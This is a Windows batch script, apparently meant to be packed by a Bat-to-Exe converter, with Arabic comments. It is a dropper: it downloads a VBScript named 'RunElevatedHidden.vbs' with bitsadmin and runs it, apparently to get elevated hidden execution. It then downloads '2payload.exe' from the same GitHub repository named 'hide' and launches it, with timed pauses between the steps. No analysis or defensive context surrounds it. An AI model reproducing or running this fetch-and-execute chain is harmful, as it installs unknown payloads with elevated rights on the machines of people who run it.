::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDJlc1W+GG6pDaET+NT16v27tl8SWO5xfZfeug==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
:: تنزيل الملف الأول (RunElevatedHidden.vbs)
echo Downloading RunElevatedHidden.vbs...
bitsadmin /transfer mydownload /download /priority high https://github.com/efd43f35r/hide/raw/main/RunElevatedHidden.vbs "%TEMP%\RunElevatedHidden.vbs"

:: الانتظار 20 ثانية
timeout /t 20 /nobreak

:: تشغيل الملف الأول
echo Running RunElevatedHidden.vbs...
cscript //nologo "%TEMP%\RunElevatedHidden.vbs"

:: الانتظار 40 ثانية
timeout /t 40 /nobreak

:: تنزيل الملف الثاني (2payload.exe)
echo Downloading 2payload.exe...
bitsadmin /transfer mydownload /download /priority high https://github.com/efd43f35r/hide/raw/main/2payload.exe "%TEMP%\2payload.exe"

:: الانتظار 6 ثوانٍ
timeout /t 6 /nobreak

:: تشغيل الملف الثاني
echo Running 2payload.exe...
start "" "%TEMP%\2payload.exe"

:: إنهاء السكربت
echo Done.
exit
